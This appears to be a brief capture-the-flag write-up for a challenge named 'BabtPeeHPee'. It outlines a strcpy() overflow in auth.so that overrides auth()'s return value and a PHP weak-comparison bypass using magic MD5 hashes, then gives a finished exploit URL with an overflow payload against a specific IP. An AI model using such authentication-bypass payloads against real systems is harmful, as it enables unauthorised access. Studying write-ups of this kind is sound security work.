# BabtPeeHPee

- auth.so
    - `strcpy()` overflow vulnerability
    - override `auth()` return value
- weak compare
    - `md5('QNKCDZO') == md5('240610708')`

- `http://185.168.130.148/?source&u=240610708&p=aaaabbbbccccddddeeeeffffgggghhhhQNKCDZO`
